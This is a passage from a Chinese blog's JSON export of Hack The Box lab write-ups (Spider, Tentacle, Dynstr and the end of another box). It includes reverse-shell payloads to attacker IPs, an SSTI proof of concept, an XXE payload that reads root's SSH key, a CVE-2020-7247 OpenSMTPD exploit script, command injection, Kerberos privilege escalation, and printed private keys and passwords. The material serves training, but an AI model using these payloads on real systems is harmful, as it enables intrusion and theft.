C:\\Users\\juliette\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState 现在我们要把sqlite文件搞下来 这里什么smb共享啊 nc传输啊 或是其他方式的，很多方法，我就不演示了，大家用自己喜欢的方法搞吧。搞下来后，在自己电脑上也要放在同一位置，然后进行查看 juliette: jUli901./())! development: fN3)sN5Ee@g administrator: [MOVED] 这是咱们得到的内容，也就是密码 咱们使用ssh登录development这个账户 咱们检查一下krypter_linux 咱们用上面相同的放式给搞下来，然后查看 我们可以看到目标机器位于1234端口 搞他 咱们使用ssh做一个动态端口转发 ssh -L 1234:127.0.0.1:1234 [development@10.10.10.228](mailto:development@10.10.10.228) 然后让我们访问一下这个页面 curl &#39;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&#39; 我们得到了一个aes密钥k19D193j.&lt;19391( 我们使用sqlmap进行注入 sqlmap -u http://127.0.0.1:1234/index.php\\?method\\=select\\&amp;username\\=administrator\\&amp;table\\=passwords --dump account = Administrator aes_key = k19D193j.&lt;19391( password = H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= 使用在线工具进行解密 https://www.devglan.com/online-tools/aes-encryption-decryption cEBzc3cwcmQhQCMkOTg5MC4v 我们使用base64进行解密 [p@ssw0rd!@#$9890./](mailto:p@ssw0rd!@#$9890./) 使用ssh登录administrator账户即可 提权administrator成功 成功拿到root权限的flag 收工吃夜宵","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Spider - Hackthebox","slug":"Hackthebox/Hard/Hackthebox-Spider","date":"2021-06-17T11:38:36.000Z","updated":"2023-06-13T03:52:52.000Z","comments":true,"path":"2021/06/17/Hackthebox/Hard/Hackthebox-Spider/","link":"","permalink":"http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/","excerpt":"","text":"Hackthebox - Spider靶场信息 靶场类型 信息搜集 使用nmap进行端口扫描 nmap -A -sS -sV -sC 10.10.10.243 我们可以看到，存在22和80端口，咱们访问一下80端口 会被重定向到spider.htb，咱们先把它加入hosts文件吧 echo 10.10.10.243 spider.htb &gt; /etc/hosts 再访问可以发现是一个家具页面，咱们做一下信息搜集 gobuster dir -u http://spider.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50 /cart (Status: 500) \\[Size: 290\\] /checkout (Status: 500) \\[Size: 290\\] /index (Status: 200) \\[Size: 11273\\] /login (Status: 200) \\[Size: 1832\\] /logout (Status: 302) \\[Size: 209\\] \\[--&gt; http://spider.htb/\\] /main (Status: 302) \\[Size: 219\\] \\[--&gt; http://spider.htb/login\\] /register (Status: 200) \\[Size: 2130\\] /user (Status: 302) \\[Size: 219\\] \\[--&gt; http://spider.htb/login\\] /view (Status: 302) \\[Size: 219\\] \\[--&gt; [http://spider.htb/login](http://spider.htb/login)\\] 我们可以看到，能访问的只有注册页面和登录页面，咱们先去看看注册页面 咱们注册一个用户 7443d68c-02b2-428c-b622-af15604cd905 咱们得到了一段UUID，使用密码登录试试 登录后似乎也只有这个页面可以点击，咱们再多看看 在做信息搜集的时候，突然醒悟过来，这会不会是个SSTI？咱们测试一下 咱们测试一下 登陆后查看一下我们的账户信息 好家伙，确实是 这里可以进行SSTI攻击，那么意味着服务器正在运行Jinja2或者Flask，这里是Flask 漏洞利用 这里我们查看一下config信息，注册一个用户 &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE\\_EXCEPTIONS&#39;: None, &#39;PRESERVE\\_CONTEXT\\_ON\\_EXCEPTION&#39;: None, &#39;SECRET\\_KEY&#39;: &#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;, &#39;PERMANENT\\_SESSION\\_LIFETIME&#39;: datetime.timedelta(31), &#39;USE\\_X\\_SENDFILE&#39;: False, &#39;SERVER\\_NAME&#39;: None, &#39;APPLICATION\\_ROOT&#39;: &#39;/&#39;, &#39;SESSION\\_COOKIE\\_NAME&#39;: &#39;session&#39;, &#39;SESSION\\_COOKIE\\_DOMAIN&#39;: False, &#39;SESSION\\_COOKIE\\_PATH&#39;: None, &#39;SESSION\\_COOKIE\\_HTTPONLY&#39;: True, &#39;SESSION\\_COOKIE\\_SECURE&#39;: False, &#39;SESSION\\_COOKIE\\_SAMESITE&#39;: None, &#39;SESSION\\_REFRESH\\_EACH\\_REQUEST&#39;: True, &#39;MAX\\_CONTENT\\_LENGTH&#39;: None, &#39;SEND\\_FILE\\_MAX\\_AGE\\_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP\\_BAD\\_REQUEST\\_ERRORS&#39;: None, &#39;TRAP\\_HTTP\\_EXCEPTIONS&#39;: False, &#39;EXPLAIN\\_TEMPLATE\\_LOADING&#39;: False, &#39;PREFERRED\\_URL\\_SCHEME&#39;: &#39;http&#39;, &#39;JSON\\_AS\\_ASCII&#39;: True, &#39;JSON\\_SORT\\_KEYS&#39;: True, &#39;JSONIFY\\_PRETTYPRINT\\_REGULAR&#39;: False, &#39;JSONIFY\\_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES\\_AUTO\\_RELOAD&#39;: None, &#39;MAX\\_COOKIE\\_SIZE&#39;: 4093, &#39;RATELIMIT\\_ENABLED&#39;: True, &#39;RATELIMIT\\_DEFAULTS\\_PER\\_METHOD&#39;: False, &#39;RATELIMIT\\_SWALLOW\\_ERRORS&#39;: False, &#39;RATELIMIT\\_HEADERS\\_ENABLED&#39;: False, &#39;RATELIMIT\\_STORAGE\\_URL&#39;: &#39;memory://&#39;, &#39;RATELIMIT\\_STRATEGY&#39;: &#39;fixed-window&#39;, &#39;RATELIMIT\\_HEADER\\_RESET&#39;: &#39;X-RateLimit-Reset&#39;, &#39;RATELIMIT\\_HEADER\\_REMAINING&#39;: &#39;X-RateLimit-Remaining&#39;, &#39;RATELIMIT\\_HEADER\\_LIMIT&#39;: &#39;X-RateLimit-Limit&#39;, &#39;RATELIMIT\\_HEADER\\_RETRY\\_AFTER&#39;: &#39;Retry-After&#39;, &#39;UPLOAD\\_FOLDER&#39;: &#39;static/uploads&#39;}&gt; 我们得到了相关的配置信息 我们筛选一下其中的关键信息 secret\\_key = Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942 首先安装一下咱们需要的模块 pip3 install flask_unsign 然后咱们使用sqlmap的eval处理session参数 sqlmap http://spider.htb/ --eval &quot;from flask\\_unsign import session as s; session = s.sign({&#39;uuid&#39;: session}, secret=&#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;)&quot; --cookie=&quot;session=\\*&quot; --delay 1 --dump 第一个选项输入Y，后面的都输入N 成功得到uuid和password uuid = 129f60ea-30cf-4065-afb9-6be45ad38b73 password = ch1VW4sHERE7331 咱们去登录 啊哈，这次出现不一样的界面了 让我们去检查一下messages /a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal 咱们得到了一个链接，去访问一下 http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal 首先让我们构造payload bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.54/4444 &lt;&amp;1&#39; 然后转化为base64格式 YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCA8JjEn 然后构造poc {% with a = request\\[\"application\"\\]\\[\"\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f\"\\]\\[\"\\\\x5f\\\\x5fbuiltins\\\\x5f\\\\x5f\"\\][\"\\\\x5f\\\\x5fimport\\\\x5f\\\\x5f\"](\"os\")[\"popen\"](\"echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTQvNDQ0NCA8JjEn | base64 -d | bash\")\\[\"read\"\\]() %} a {% endwith %} 然后本地监听一个端口 nc -nvlp 4444 成功getshell 成功拿到user权限的flag 权限提升 我们可以看到&#x2F;home&#x2F;chiv目录下存在.ssh目录，那应该是存在密钥的，咱们进去看看 成功拿到私钥 -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9 MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7 BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2 VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu 6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq 54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62 nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8 gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb 0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2 nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6 IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw== -----END RSA PRIVATE KEY----- 保存到本地 使用ssh进行登录 登录成功 查看一下正在运行的端口 ss -tupln 咱们发现本地运行着8080端口 咱们需要把端口转发出来 ssh -i id\\_chiv -L 8080:localhost:8080 chiv@spider.htb 然后咱们打开firefox进行访问http://127.0.0.1:8080/ 端口转发成功 这边随便一个账户都可以登录 咱们查看一下cookie，这里cookie需要解密 .eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl\\_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv\\_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl\\_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz\\_zI8\\_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YMsGpQ.L71-NNdbcE09uMjZzZWHHG-Zytw 使用flask-unsign进行解码 flask-unsign --decode --cookie .eJw1jE1PwyAAhv-K4eyB1u3SZJcKtHZChfLRcbNhCa3Q1clhbtl\\_d9N4fPM8z3sB4RQDKC7gYQAFUJgRh0-SfzRamDTrmJm9od9Dbcd3RVayWkqnMsR7QTUSrwr7rYsvZ9UldONzp1jZkqUWU2nv\\_L4tDIgb13CIV5b4dqhYYsaPOlNHqUWzDyVqJZlosOtdzCpHFsVwuvl\\_f7-99N7gdTTada4iPXtOTNQu32nf2hB6NQuvz\\_zI8\\_DvUxqag8WObCH7dE92GmTILebwjW824PoIlsM4py9QwOsPiZ9VQg.YMsGpQ.L71-NNdbcE09uMjZzZWHHG-Zytw 返回了一段base64码 {&#39;lxml&#39;: b&#39;PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+MTIzPC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=&#39;, &#39;points&#39;: 0} 咱们解密一下 咱们查看源代码 我们在登录页面的源代码中可以看到有一个hidden值，所以咱们可以利用XXE攻击 参考链接 https://github.com/LucifielHack/PayloadsAllTheThings/tree/master/XXE%20Injection 咱们构造一个poc username=%26username%3b&amp;version=1.0.0--&gt;&lt;!DOCTYPE+foo+\\[&lt;!ENTITY+username+SYSTEM+&quot;/root/.ssh/id\\_rsa&quot;&gt;+\\]&gt;&lt;!-- 然后使用burp抓个包 然后咱们加入构造的poc 成功获得root用户的密钥 咱们保存到本地 使用密钥进行登录 成功登录root权限 成功拿到root权限的flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Tentacle - Hackthebox","slug":"Hackthebox/Hard/Hackthebox-Tentacle","date":"2021-06-16T11:38:36.000Z","updated":"2023-06-13T03:53:43.000Z","comments":true,"path":"2021/06/16/Hackthebox/Hard/Hackthebox-Tentacle/","link":"","permalink":"http://www.lucifiel.com/2021/06/16/Hackthebox/Hard/Hackthebox-Tentacle/","excerpt":"","text":"Hackthebox - Tentacle靶场信息 靶场类型 信息搜集 使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.224 我们可以看到，开启了22、53、88、3128、9090几个端口 首先让我们看看3128端口吧，这个端口是Squid代理的默认端口，我也是第一次遇到，比较感兴趣 这里报错了，但是给出了一个域名realcorp.htb 经过测试，该域名的用法是使用这个域名来进行子域名枚举，这里使用dnsenum进行枚举 dnsenum –threads 64 –dnsserver 10.10.10.224 -f &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-110000.txt realcorp.htb ns.realcorp.htb. 259200 IN A 10.197.243.77 proxy.realcorp.htb. 259200 IN CNAME ns.realcorp.htb. ns.realcorp.htb. 259200 IN A 10.197.243.77 wpad.realcorp.htb. 259200 IN A 10.197.243.31 我们得到了几个域，但是无法直接访问，所以我们使用proxychains4来枚举它 先让我们编辑一下代理配置文件&#x2F;etc&#x2F;proxychains.conf echo “[ProxyList]\\nhttp 10.10.10.224 3128\\nhttp 127.0.0.1 3128\\nhttp 10.197.243.77 3128” &gt; &#x2F;etc&#x2F;proxychains.conf 设置好以后，使用nmap进行扫描 proxychains -f &#x2F;etc&#x2F;proxychains.conf nmap -sT -Pn 10.197.243.31 经过非常漫长的等待以后，咱们发现开启了这几个端口 我们可以看到，有一个80端口开着，咱们通过代理去访问看看 proxychains firefox wpad.realcorp.htb 无法被访问 咱们添加一个本地解析 echo 10.197.243.31 wpad.realcorp.htb &gt; &#x2F;etc&#x2F;hosts 再次访问就提示403了，咱们做一个信息搜集看看 proxychains dirb http://wpad.realcorp.htb/ 经过漫长的等待后，并没有获得什么有用的信息。 然后我把着眼点放到了子域名上 wpad，我去google了一下 发现有一个wpad.dat的文件，咱们去试试能不能下载下来 proxychains firefox http://wpad.realcorp.htb/wpad.dat OK 存在这个文件，并且可以下载 WPAD协议分析及内网渗透利用 https://xz.aliyun.com/t/1739#toc-9 在我自己测试的时候，第一个段10.197.243.0&#x2F;24这个IP段，咱们可以跳过 在扫描第二个IP段10.241.251.0&#x2F;24的时候，经过了大量的信息搜集，发现10.241.251.113开启了smtp端口，因为我已经做过一次了，就不做重复用工，直接扫描113这台机器 proxychains -f &#x2F;etc&#x2F;proxychains.conf nmap -sT -sV -Pn 10.241.251.113 我们可以看到，113这台机器开启了25端口，也就是smtp服务 漏洞利用 可以看到这里使用的是OpenSMTPD，咱们去搜索一下相关的漏洞 咱们找到了一个CVE-2020-7247 https://www.exploit-db.com/exploits/47984 咱们简单修改一下Exploit #!&#x2F;usr&#x2F;bin&#x2F;env python3 import socket, time import sys if len(sys.argv) &lt; 4: print(“usage: exploit.py “) exit() HOST &#x3D; sys.argv[1] PORT &#x3D; int(sys.argv[2]) rev_shell_cmd &#x3D; sys.argv[3] payload &#x3D; b”””\\r\\n #0\\r\\n #1\\r\\n #2\\r\\n #3\\r\\n #4\\r\\n #5\\r\\n #6\\r\\n #7\\r\\n #8\\r\\n #9\\r\\n #a\\r\\n #b\\r\\n #c\\r\\n #d\\r\\n “”” + rev_shell_cmd.encode() + b””” . “”” for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM): af, socktype, proto, canonname, sa &#x3D; res try: s &#x3D; socket.socket(af, socktype, proto) except OSError as msg: s &#x3D; None continue try: s.connect(sa) except OSError as msg: s.close() s &#x3D; None continue break if s is None: print(“Could not open socket”) sys.exit(1) with s: data &#x3D; s.recv(1024) print(‘Received’, repr(data)) time.sleep(1) print(‘SENDING HELO’) s.send(b”helo test.com\\r\\n”) data &#x3D; s.recv(1024) print(‘RECIEVED’, repr(data)) s.send(b”MAIL FROM:&lt;;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;&gt;\\r\\n”) time.sleep(1) data &#x3D; s.recv(1024) print(‘RECIEVED’, repr(data)) s.send(b”RCPT TO:j.nakazawa@realcorp.htb\\r\\n”) data &#x3D; s.recv(1024) print(‘RECIEVED’, repr(data)) s.send(b”DATA\\r\\n”) data &#x3D; s.recv(1024) print(‘RECIEVED’, repr(data)) s.send(payload) data &#x3D; s.recv(1024) print(‘RECIEVED’, repr(data)) s.send(b”QUIT\\r\\n”) data &#x3D; s.recv(1024) print(‘RECIEVED’, repr(data)) print(“Exploited”) s.close() 保存为exploit.py后，本地使用nc开启一个端口监听 nc -nvlp 4444 使用proxychains4代理运行该脚本 proxychains4 python3 expliot.py 10.241.251.113 25 ‘bash -c “exec bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.2&#x2F;4444 &lt;&amp;1”‘ 成功拿到一个shell，并且直接就是root权限 但是这个shell是smtp的root，并不是系统的root，咱们还要想办法提权 权限提升 咱们进入&#x2F;home目录查看一下 有一个j.nakazawa目录，咱们进去找一下有没有用的东西 我们在里面找到一个.msmtprc文件，咱们查看一下 咱们得到了用户j.nakazawa的账号密码 USERNAME &#x3D; j.nakazawa PASSWORD &#x3D; sJB}RM&gt;6Z~64_ 但这个用户无法直接登录ssh，所以咱们还得想办法来利用 各位还记得10.10.10.224这台机器上 3128端口中另一个线索吗 没错，就是这个srv01.realcorp.htb，咱们将它加入到hosts里 echo 10.10.10.224 srv01.realcorp.htb &gt; &#x2F;etc&#x2F;hosts 记得确保hosts文件中只有这一台主机，输入上面的指令即可 然后我们使用kerbos生成票据进行登录 apt install krb5-user 然后咱们修改对应配置 vim &#x2F;etc&#x2F;krb5.conf [libdefaults] default_realm &#x3D; REALCORP.HTB [realms] REALCORP.HTB &#x3D; { kdc &#x3D; 10.10.10.224 } [domain_realm] srv01.realcorp.htb &#x3D; REALCORP.HTB 分别填入对应位置即可 然后咱们去生成票据 kinit j.nakazawa password：sJB}RM&gt;6Z~64_ 然后咱们检查一下可用的票据 klist OK，确定生成成功 然后咱们使用ssh进行登录 ssh j.nakazawa@10.10.10.224 登录成功 成功获得user权限的flag 咱们查看一下&#x2F;etc&#x2F;crontab 定时任务发现admin定时运行&#x2F;usr&#x2F;local&#x2F;bin&#x2F;log_backup.sh 咱们查看一下 我们可以看到，是从squid目录复制文件到admin目录，那么我们如果写入认证文件到squid目录，从而使其被复制到admin目录呢？说干就干 现在创建一个名为.k5login的文件，并复制到squid目录下 echo “&#x6a;&#x2e;&#x6e;&#97;&#x6b;&#x61;&#122;&#97;&#119;&#x61;&#x40;&#82;&#69;&#x41;&#x4c;&#x43;&#x4f;&#x52;&#x50;&#46;&#72;&#x54;&#x42;“ &gt;&gt; .k5login cp .k5login &#x2F;var&#x2F;log&#x2F;squid 然后我们稍等一会儿之后，使用admin的身份来进行登录 OK，成功拿到admin权限 但是我发现，权限还是不够，咱们还不是root权限，还得提。。。 好家伙，这得提三次权也是没谁了 咱们使用klist查看一下&#x2F;etc&#x2F;krb5.keytab这个文件 klist -k &#x2F;etc&#x2F;krb5.keytab 咱们发现了有很多个Kerberos的加密密钥 咱们使用kadmin进行利用 kadmin -k -t &#x2F;etc&#x2F;krb5.keytab -p kadmin&#x2F;admin@REALCORP.HTB add_principal root@REALCORP.HTB 然后自己设置一个密码即可 然后使用ksu切换到root即可 成功提权到root 成功拿到root权限的flag 收工睡觉 哎，目前在线的easy和medium都打完了，今天开始只能打hard难度的了，难顶啊","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Dynstr - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Dynstr","date":"2021-06-15T11:38:36.000Z","updated":"2023-06-13T03:43:52.000Z","comments":true,"path":"2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/","link":"","permalink":"http://www.lucifiel.com/2021/06/15/Hackthebox/Medium/Hackthebox-Dynstr/","excerpt":"","text":"Hackthebox - Dynstr靶场信息 靶场类型 信息搜集首先使用nmap进行端口扫描 我们可以看到，开启了22 53 80三个端口，让我们访问80端口看看 访问后，我们找到了三个域名，老规矩，添加进hosts echo &quot;10.10.10.244 dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb dynstr.htb&quot; &gt;&gt; /etc/hosts 我访问了一下这几个域名，并没有什么东西，那咱们做个信息搜集吧 就拿最短的dyna.htb入手吧 wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u &quot;http://dyna.htb&quot; -H &quot;HOST: FUZZ.dyna.htb&quot; 咱们需要过滤掉10909个字符 加上–hh 10909 啊这，结果啥都没找到，那只能去看看有没有啥公开漏洞了呀 ISC BIND 9.16.1搜索这个的漏洞 找到一个缓冲区溢出，但是却没有利用的exploit，这就很难受了呀。没办法，继续返回做信息搜集吧 咱们爆破一下目录吧 gobuster dir -u &quot;http://dyna.htb&quot; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 发现两个目录 &#x2F;assets这个目录无法访问 &#x2F;nic这个目录显示空白 咱们需要进一步fuzz 得到一个badauth，再加上在主页找到的凭证 Username: dynadns Password: sndanyd 咱们使用curl的-u功能进行访问 curl -u dynadns:sndanyd http://dyna.htb/nic/update 得到了一个线索，nochg，咱们去Google一下这是啥东西 https://www.noip.com/integrate/response https://help.dyn.com/remote-access-api/return-codes/ 这导致no-ip dynamic dns看到相应代码 我们可以看到nochg告诉我们还没有提供要更新的主机名，所以让我们深入了解如何更新dns记录 https://www.noip.com/integrate/request 所以我们可以更新dns记录，但是它需要有效 咱们先使用burp拦截一个请求 漏洞利用访问http://dyna.htb/nic/update?hostname=dyna.htb&myip=10.10.14.197 然后在请求暴力添加一个标头Authorization: Basic ZHluYWRuczpzbmRhbnlk 这个标头的base64里包含了账号密码 但是不知道为什么一直报错 经过多次尝试后，要随便加一个并不存在的子域名 成了 尝试了一下命令执行，提示报错，但可以确定是存在该漏洞的 https://github.com/LucifielHack/command-injection-payload-list 这是命令执行的表，大伙儿可以自个儿去fuzz一下 $(echo+id+|bash)”这是我测试出来的命令执行格式 现在咱们要反弹一个shell回去 首先本地监听一个端口 nc -nvlp 999 然后构造反弹的命令 /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.197/999 0&gt;&amp;1&#39; 由于直接放到burp里去执行很麻烦，所以咱们先给他转为base64 L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny85OTkgMD4mMSc&#x3D;然后使用管道功能进行解码，然后再通过管道传回bash /nic/update?hostname=\\$(echo+L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny85OTkgMD4mMSc=+|+base64+-d+|+bash)&quot;arz.no-ip.htb&amp;myip=10.10.14.197 成功弹回shell 使用python3获得一个较为稳定的shell 咱们查看了一下passwd文件，发现了有一个bindmgr用户，同时在&#x2F;home目录下也有他的文件夹 咱们进去查看一下 咱们似乎发现了一些有趣的东西 我们查看一下C62796521-debugging.script 查看的同时会发现内容有点多，容易造成乱码。大家看仔细点，反正我是看的脑瓜子疼 复制出来后，经过处理保存到本地，成功获得了一个ssh的密钥，咱们去登录试试 但是这还是需要密码，这指定是不对啊，咱们再去看看 咱们查看了一下update的源代码，可以看到nsupdate与密钥一起使用&#x2F;etc&#x2F;bind&#x2F;ddns.key 所以这里要使用不同的密钥，咱们进入&#x2F;etc&#x2F;bind 咱们需要讲infra.key添加到DNS记录 nsupdate -v -k /etc/bind/infra.key update add arz.infra.dyna.htb 86400 a 10.10.14.197 send show 这时候如果我们运行nslookup，我们会得到一个回复，这意味着这个记录已经被添加进去了 但是我们仍然无法通过 ssh 登录，因为 dns 的使用已启用，因为 ssh 会进行反向 dns 查找过程，因此域名正在解析为 IP，但 IP 地址不会解析为域名，因此我们需要添加PTR记录为此目的 咱们去添加一个A记录 nsupdate -k /etc/bind/infra.key update add anything.infra.dyna.htb 86400 A 10.10.14.197 此行为空格 下一行的IP为D.C.B.A格式，也就是把我们的IP反过来 update add 197.14.10.10.in-addr.arpa. 300 PTR anything.infra.dyna.htb send 输入 echo &quot;-----BEGIN OPENSSH PRIVATE KEY-----\\\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\\\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\\\\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\\\\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\\\\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\\\\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\\\\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\\\\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\\\\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\\\\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\\\\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\\\\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\\\\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\\\\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\\\\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\\\\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\\\\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\\\\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\\\\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\\\\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\\\\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\\\\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\\\\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7v